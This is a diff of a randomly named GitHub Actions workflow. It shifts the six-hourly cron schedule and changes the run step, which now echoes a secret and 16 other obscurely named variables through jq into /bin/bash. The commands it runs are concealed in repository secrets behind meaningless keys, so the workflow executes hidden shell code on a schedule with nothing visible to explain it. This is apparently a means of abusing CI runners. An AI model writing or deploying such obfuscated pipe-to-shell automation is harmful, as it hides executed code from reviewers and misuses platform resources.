@@ -3,8 +3,7 @@ name: meihaxi2513
 on:
   workflow_dispatch:
   schedule:
-    - cron: '32 5/6 * * *'
-
+    - cron: '4 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -13,13 +12,23 @@ jobs:
       - uses: actions/checkout@v4
       - name: meihaxi2513
         env:
-          dwqf93: ${{ secrets.dwqf93 }}
+          no3534: ${{ secrets.no3534 }}
         run: |
-          echo $dwqf93 | jq -r .ujrc29 | /bin/bash
-          echo $wfuak83325 | jq -r .y1338 | /bin/bash
-          echo $avur842 | jq -r .qxc908 | /bin/bash
-          echo $fi9970 | jq -r .dq197 | /bin/bash
-          echo $es50 | jq -r .ite5234 | /bin/bash
-          echo $wj75111 | jq -r .uswuz8279 | /bin/bash
-          echo $kkw3 | jq -r .zyw08 | /bin/bash
+          echo $no3534 | jq -r .iq42648 | /bin/bash
+          echo $dku67761 | jq -r .hzoe91 | /bin/bash
+          echo $kni346 | jq -r .ccff00507 | /bin/bash
+          echo $nl8273 | jq -r .qgu5721 | /bin/bash
+          echo $j776 | jq -r .ayidc03985 | /bin/bash
+          echo $acey7 | jq -r .l2 | /bin/bash
+          echo $jhybc12976 | jq -r .lt2 | /bin/bash
+          echo $seoo0 | jq -r .i2034 | /bin/bash
+          echo $puiw004 | jq -r .u3 | /bin/bash
+          echo $lbcx222 | jq -r .hop50669 | /bin/bash
+          echo $h627 | jq -r .qwpv7083 | /bin/bash
+          echo $sn2 | jq -r .vsr07379 | /bin/bash
+          echo $wno2501 | jq -r .uotwm45 | /bin/bash
+          echo $er49974 | jq -r .zvntf97 | /bin/bash
+          echo $mbsa68 | jq -r .zp548 | /bin/bash
+          echo $bcnf680 | jq -r .jk32 | /bin/bash
+          echo $iprus89 | jq -r .ctdrv1 | /bin/bash
 
